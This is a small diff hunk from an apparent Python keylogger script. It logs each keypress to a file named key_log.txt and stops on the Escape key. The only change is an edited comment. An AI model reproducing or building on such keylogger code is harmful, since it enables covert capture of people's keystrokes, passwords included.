@@ -10,7 +10,7 @@ logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, for
 
 def on_press(key):
     logging.info(str(key))
-    # Stop logger
+    # Stop logger with escape key 
     if key == Key.esc:
         return False
 
